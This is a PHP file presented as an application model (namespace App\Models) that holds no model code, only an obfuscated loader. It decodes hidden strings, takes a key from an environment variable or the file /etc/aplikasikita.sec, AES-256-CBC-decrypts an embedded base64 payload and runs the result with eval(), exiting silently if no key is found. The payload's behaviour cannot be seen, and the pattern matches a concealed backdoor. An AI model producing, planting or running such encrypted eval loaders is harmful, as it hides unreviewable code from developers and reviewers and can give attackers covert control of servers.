<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('I58VHcAqaaWTEhvLO4b0kw==');

$c=base64_decode(

'5d1WO+h2jNIwUC8k2/asYS/wN+znfRD6a7R+/FQ0wroBHASYZSqxXEJwcTWlp+kGTyz2fMjMNVai' .
'xRjp0HF8lbtcvZHnqu/R+vuUURJsW9jWKH8xK01P2+EDsjJn56nMSqMxU4KsC35LvAfhesf887U+' .
'AQoYrbfo6XYrzKFkH3nqw9Mas+h04ESzB6Nc7CH+secO+EstjPxiZABOjw1IQhfX8oYEzSyO9oFf' .
'lQWb9dy/SoL6lpAZB5ZZilRjJqhk33ArlEF9iUSc+7Dj3QKk8LxlnwQ63NtukylHUyaU1xBnclq7' .
'm9VaRr9YODjjqdlFdtZo8c5Fe4HDiz+KL7xTR2fT1V3dwXNQAAf0VC47/Gz4aPeEAmDnF7XDGg5m' .
'W2uMImWIPkEllgNwnMKXorNZvgbtM0t0616rb7VSpLuubKUEHLnPzhpiReyh9puYB7G8XlISFrDo' .
'1lMdr+7ks0QbemaPTO+D9tUfZKhbrphcUNHJOMO5QnYEpEtNELwjgN4Ggp1xuPviJXfxf67pX8Uj' .
'T5y6EuCxB65tYAJKbI95VN9vmeZXdcQrsKS/BJFH+eeMj5t5d8IA9u1/UMiDCPVZQ4E31kelMY4F' .
'zTz891/UpZVS3Q6dVdWPmp3ullhCXuVd7SkcmeoKPIVR6D1MyV3mKvtzY/ezRxxB6FMCO205hN1D' .
'iylC2nJTH91ccctKc7H4LUBrVnl+baS6vtJjqHVEW3z1l/PZNO1Bnx536tOJia/jmFatpwFTKBSa' .
'WihoeeRYQ8jyi6tmZ2/iSO4J+87x3Uh1tEAbhkLfjMgwFr8ZIFtR31GPDB4HzeBxRSXQZC2qtUNw' .
'TuqBg72NevvLE51lcDu1vSK4j5ZB52vCth6rRZXvp3vyRTFxUS7BB+SgtYwO6U6P+eaWblfWTehy' .
'ff0sPHLoCL8iPu2HxBYhxO3BELok0UzJa5JuivKlm/I4r2fTcH5lu+AYxhTTlbUMcs5CZQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

